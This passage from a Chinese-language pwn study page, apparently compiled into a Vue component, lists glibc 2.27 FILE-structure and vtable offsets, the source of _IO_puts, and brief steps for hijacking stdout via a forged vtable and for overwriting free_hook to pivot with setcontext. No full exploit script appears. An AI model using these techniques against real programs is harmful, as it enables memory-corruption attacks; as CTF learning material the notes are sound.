</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="io-wide-data结构体-1" tabindex="-1"><a class="header-anchor" href="#io-wide-data结构体-1" aria-hidden="true">#</a> _IO_wide_data结构体</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>
<span class="token comment">/*    8      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>
<span class="token comment">/*   16      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>
<span class="token comment">/*   24      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>
<span class="token comment">/*   32      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>
<span class="token comment">/*   40      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>
<span class="token comment">/*   48      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>
<span class="token comment">/*   56      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>
<span class="token comment">/*   64      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span>
<span class="token comment">/*   72      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>
<span class="token comment">/*   80      |     8 */</span>    <span class="token class-name">wchar_t</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span>
<span class="token comment">/*   88      |     8 */</span>    __mbstate_t _IO_state<span class="token punctuation">;</span>
<span class="token comment">/*   96      |     8 */</span>    __mbstate_t _IO_last_state<span class="token punctuation">;</span>
<span class="token comment">/*  104      |   192 */</span>    <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token punctuation">{</span>
<span class="token comment">/*  104      |     8 */</span>        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_destr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  112      |     8 */</span>        <span class="token keyword">enum</span> <span class="token class-name">__codecvt_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_out<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">,</span> __mbstate_t <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  120      |     8 */</span>        <span class="token keyword">enum</span> <span class="token class-name">__codecvt_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_unshift<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">,</span> __mbstate_t <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  128      |     8 */</span>        <span class="token keyword">enum</span> <span class="token class-name">__codecvt_result</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_in<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">,</span> __mbstate_t <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  136      |     8 */</span>        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_encoding<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  144      |     8 */</span>        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_always_noconv<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  152      |     8 */</span>        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_length<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">,</span> __mbstate_t <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  160      |     8 */</span>        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>__codecvt_do_max_length<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*  168      |    64 */</span>        _G_iconv_t __cd_in<span class="token punctuation">;</span>
<span class="token comment">/*  232      |    64 */</span>        _G_iconv_t __cd_out<span class="token punctuation">;</span>

                               <span class="token comment">/* total size (bytes):  192 */</span>
                           <span class="token punctuation">}</span> _codecvt<span class="token punctuation">;</span>
<span class="token comment">/*  296      |     4 */</span>    <span class="token class-name">wchar_t</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">/* XXX  4-byte hole  */</span>
<span class="token comment">/*  304      |     8 */</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>_wide_vtable<span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  312 */</span>
                         <span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="虚表-1" tabindex="-1"><a class="header-anchor" href="#虚表-1" aria-hidden="true">#</a> 虚表</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token comment">/* offset    |  size */</span>  type <span class="token operator">=</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token punctuation">{</span>
<span class="token comment">/*    0      |     8 */</span>    <span class="token class-name">size_t</span> __dummy<span class="token punctuation">;</span>
<span class="token comment">/*    8      |     8 */</span>    <span class="token class-name">size_t</span> __dummy2<span class="token punctuation">;</span>
<span class="token comment">/*   16      |     8 */</span>    _IO_finish_t __finish<span class="token punctuation">;</span>
<span class="token comment">/*   24      |     8 */</span>    _IO_overflow_t __overflow<span class="token punctuation">;</span>
<span class="token comment">/*   32      |     8 */</span>    _IO_underflow_t __underflow<span class="token punctuation">;</span>
<span class="token comment">/*   40      |     8 */</span>    _IO_underflow_t __uflow<span class="token punctuation">;</span>
<span class="token comment">/*   48      |     8 */</span>    _IO_pbackfail_t __pbackfail<span class="token punctuation">;</span>
<span class="token comment">/*   56      |     8 */</span>    _IO_xsputn_t __xsputn<span class="token punctuation">;</span>
<span class="token comment">/*   64      |     8 */</span>    _IO_xsgetn_t __xsgetn<span class="token punctuation">;</span>
<span class="token comment">/*   72      |     8 */</span>    _IO_seekoff_t __seekoff<span class="token punctuation">;</span>
<span class="token comment">/*   80      |     8 */</span>    _IO_seekpos_t __seekpos<span class="token punctuation">;</span>
<span class="token comment">/*   88      |     8 */</span>    _IO_setbuf_t __setbuf<span class="token punctuation">;</span>
<span class="token comment">/*   96      |     8 */</span>    _IO_sync_t __sync<span class="token punctuation">;</span>
<span class="token comment">/*  104      |     8 */</span>    _IO_doallocate_t __doallocate<span class="token punctuation">;</span>
<span class="token comment">/*  112      |     8 */</span>    _IO_read_t __read<span class="token punctuation">;</span>
<span class="token comment">/*  120      |     8 */</span>    _IO_write_t __write<span class="token punctuation">;</span>
<span class="token comment">/*  128      |     8 */</span>    _IO_seek_t __seek<span class="token punctuation">;</span>
<span class="token comment">/*  136      |     8 */</span>    _IO_close_t __close<span class="token punctuation">;</span>
<span class="token comment">/*  144      |     8 */</span>    _IO_stat_t __stat<span class="token punctuation">;</span>
<span class="token comment">/*  152      |     8 */</span>    _IO_showmanyc_t __showmanyc<span class="token punctuation">;</span>
<span class="token comment">/*  160      |     8 */</span>    _IO_imbue_t __imbue<span class="token punctuation">;</span>

                           <span class="token comment">/* total size (bytes):  168 */</span>
                         <span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="虚表实现-1" tabindex="-1"><a class="header-anchor" href="#虚表实现-1" aria-hidden="true">#</a> 虚表实现</h3><blockquote><p>2.27的实现都是分散的不是集中在一起的就参考_IO_jump_t吧</p></blockquote><h3 id="劫持puts-io-2-stdout" tabindex="-1"><a class="header-anchor" href="#劫持puts-io-2-stdout" aria-hidden="true">#</a> 劫持puts <em>IO_2_stdout</em></h3><blockquote><p>因为2.27具备hook 所以其实打io并不是一个很好的选择</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">int</span>
<span class="token function">_IO_puts</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  _IO_size_t len <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
       <span class="token operator">||</span> <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> str<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> len
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_putc_unlocked</span> <span class="token punctuation">(</span><span class="token char">&#39;\\n&#39;</span><span class="token punctuation">,</span> _IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">MIN</span> <span class="token punctuation">(</span>INT_MAX<span class="token punctuation">,</span> len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>也就是保证lock指向的位置值为1</li><li>_mode应该为0</li><li>vtable应该为_IO_wfile_jumps-32,方便调用<code>_IO_wfile_overflow</code></li></ul><h2 id="free-hook" tabindex="-1"><a class="header-anchor" href="#free-hook" aria-hidden="true">#</a> free_hook</h2><p>直接打free_hook就行 rdi就是我们的free的参数 这样我们就可以利用setcontext进行控制</p>`,70),e=[o];function c(l,u){return s(),a("div",null,e)}const r=n(p,[["render",c],["__file","IO偏移.html.vue"]]);export{r as default};
